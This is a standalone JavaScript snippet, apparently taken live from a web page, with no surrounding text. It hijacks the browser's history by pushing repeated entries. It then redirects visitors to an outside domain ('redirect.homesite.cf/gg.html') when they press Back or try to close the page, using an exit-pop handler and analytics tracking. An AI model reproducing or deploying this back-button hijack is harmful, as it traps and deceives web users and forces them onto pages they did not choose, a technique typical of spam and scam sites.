<script> window.reverseConfig = { url: { 'domain': 'redirect.homesite.cf/gg.html' }, debug: 0, }; (function (w,l,d,h) { var url = `//${reverseConfig.url.domain}/${reverseConfig.url.params}`; function redirect() { if (window.reverseConfig.debug == 1) { console.log('redirect() -> ' + url); } else { w.onbeforeunload = null; w.location.replace(url); } } var blockHistory = function (w,l,d,h) { h.replaceState(null, d.title, l.pathname+l.search); for(var i=0;i<10;i++) { try { h.pushState(null, d.title, l.pathname+l.search); } catch (e) { i=10; } } var onPopstate = function () { h.replaceState(null, d.title, l.pathname+l.search); redirect(); }; if (w.addEventListener) { w.addEventListener('popstate',onPopstate); } else { w.onpopstate = onPopstate; } }; var setExitpop = function () { if (w.onbeforeunload === null) { w.onbeforeunload = function () { var to = setTimeout(function() { if (typeof ym !== 'undefined' && YMID) ym(YMID, 'reachGoal', 'onClose', {}, function () { console.log('onClose'); }); redirect(); }, 100); return '*'; }; } }; d.onreadystatechange = function () { if (d.readyState === 'interactive') { blockHistory(w,l,d,h); setExitpop(); d.addEventListener('click', function(e) { for (var target = e.target; target && target != this; target = target.parentNode) { if (target.matches('a') ) { w.onbeforeunload = null; break; } } }, false); } }; })(window,location,document,history); </script>
